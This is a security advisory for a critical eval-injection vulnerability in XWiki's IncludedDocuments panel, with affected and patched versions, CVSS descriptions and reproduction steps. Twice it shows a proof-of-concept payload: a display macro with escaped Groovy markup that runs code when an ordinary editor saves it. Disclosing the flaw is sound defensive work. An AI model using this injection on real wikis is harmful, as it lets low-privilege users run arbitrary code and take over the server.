# Improper Neutralization of Directives in Dynamically Evaluated Code ('Eval Injection') in org.xwiki.platform:xwiki-platform-panels-ui (IncludedDocuments)

Critical

[tmortagne](/tmortagne)
published
GHSA-qx9h-c5v6-ghqh
Apr 12, 2023

## Package

maven

org.xwiki.platform:xwiki-platform-panels-ui
([Maven](/advisories?query=ecosystem%3Amaven))

## Affected versions

>= 1.1 M2

## Patched versions

 13.10.11, 14.4.7, 14.10

## Description

### Impact

Any user with edit rights can execute arbitrary Groovy, Python or Velocity code in XWiki leading to full access to the XWiki installation. The root cause is improper escaping of the included pages in the IncludedDocuments panel.

**Precondition**: As an admin, add the `Panels.IncludedDocuments` panel on one column.

A proof of concept exploit is to edit a document and add the following code before saving.

```
{{display reference="{{cache~}~}{{groovy~}~}println(~"Hello from Groovy~" + ~" in included document!~"){{/groovy~}~}{{/cache~}~}"/}}

```

**expected**

The right had side panels contain:

```
One included page:
{{cache}}{{groovy}}println("Hello from Groovy" + " in included document!"){{/groovy}}{{/cache}}

```

**actual**

The right had side panels contain:

```
One included page:
    XWiki.Hello from Groovy in included document!

```
### Patches

The problem has been patched on XWiki 14.4.7, and 14.10.

### Workarounds

The issue can be fixed manually applying this [patch](https://github.com/xwiki/xwiki-platform/commit/50b4d91418b4150933f0317eb4a94ceaf5b69f67).

# CVSS v3 base metrics

Attack vector:
More severe the more the remote (logically and physically) an attacker can be in order to exploit the vulnerability.

Attack complexity:
More severe for the least complex attacks.

Privileges required:
More severe if no privileges are required.

User interaction:
More severe when no user interaction is required.

Scope:
More severe when a scope change occurs, e.g. one vulnerable component impacts resources in components beyond its security scope.

Confidentiality:
More severe when loss of data confidentiality is highest, measuring the level of data access available to an unauthorized user.

Integrity:
More severe when loss of data integrity is the highest, measuring the consequence of data modification possible by an unauthorized user.

Availability:
More severe when the loss of impacted component availability is highest.

#### Description

**Steps to reproduce:**

1. As an admin, add the Panels.IncludedDocuments panel on one column
2. As a user without script or programming right open your user account (or any other document you can edit with the wiki editor.
3. Set the content to
   ```
   {{display reference="{{cache~}~}{{groovy~}~}println(~"Hello from Groovy~" + ~" in included document!~"){{/groovy~}~}{{/cache~}~}"/}}
   ```

   .

1. Click "Save and continue"

**Expected result:**

The panel displays

```
One included page:
{{cache}}{{groovy}}println("Hello from Groovy" + " in included document!"){{/groovy}}{{/cache}}
```

.

**Actual result:**

The panel displays the text

```
One included page:
    XWiki.Hello from Groovy in included document!
```

This demonstrates a privilege escalation from simple user account to programming rights.
